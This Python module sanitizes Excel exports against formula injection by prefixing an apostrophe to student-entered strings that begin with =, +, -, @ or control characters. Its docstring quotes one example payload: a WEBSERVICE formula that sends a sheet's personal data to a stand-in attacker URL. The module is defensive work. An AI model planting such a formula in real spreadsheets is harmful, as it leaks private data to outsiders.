"""Excel formula-injection (CSV/formula injection) safety helpers.

Security (issue #1081 finding G): student-supplied free-text values (dynamic
form fields, names, etc.) are written into .xlsx exports that college/admin
reviewers download and open. openpyxl writes a string beginning with ``=`` as a
LIVE formula cell; a payload such as
``=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,N:N))`` can reference
the entire sheet and exfiltrate the whole cohort's PII to an attacker URL once a
reviewer opens the file and enables editing. LibreOffice Calc has no Protected
View gate at all.

Mitigation: prefix any exported STRING value that begins with a formula-trigger
character (`=`, `+`, `-`, `@`) or a control character that a spreadsheet may
treat as a formula lead-in (tab, CR, LF) with a single apostrophe, which forces
the cell to be treated as literal text. Numbers, dates, bools, None and already
safe strings are returned unchanged so normal exports are byte-for-byte
identical.
"""

from typing import Any

# Characters that make a spreadsheet interpret the cell as a formula when they
# lead the value. Tab/CR/LF are included because some importers strip a leading
# apostrophe-less control char and re-expose the following `=`.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r", "\n")


def sanitize_excel_cell(value: Any) -> Any:
    """Return ``value`` made safe to write into an openpyxl cell.

    Only ``str`` values are altered — and only when they begin with a
    formula-trigger character, by prefixing a single apostrophe. All other
    types (int/float/bool/datetime/None/…) pass through unchanged so numeric and
    date cells keep their native type and formatting.
    """
    if isinstance(value, str) and value and value[0] in _FORMULA_TRIGGERS:
        return "'" + value
    return value
